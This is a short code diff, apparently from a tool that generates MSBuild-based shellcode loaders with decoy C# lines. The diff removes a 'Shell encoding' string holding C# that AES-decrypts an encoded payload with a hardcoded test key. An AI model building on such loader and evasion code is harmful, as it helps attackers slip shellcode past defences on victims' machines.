@@ -40,18 +40,7 @@ fakecs=[
 "int i;",
 "char a;",
 "string mine"]
-					
-# Shell encoding
-################
-ENCODING='''
-						AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
-						byte[] iv = new byte[16];
-						Buffer.BlockCopy(encoded, 0, iv, 0, 16);
-						byte[] data = new byte[encoded.Length-16];
-						Buffer.BlockCopy(encoded, 16, data, 0, encoded.Length-16);
-						var dec = aes.CreateDecryptor(Encoding.ASCII.GetBytes("TESTXXXXXXXXXXXX"), iv);
-						byte[] final = dec.TransformFinalBlock(data, 0, data.Length);
-'''					
+
 					
 # Template for MSBuild
 ######################
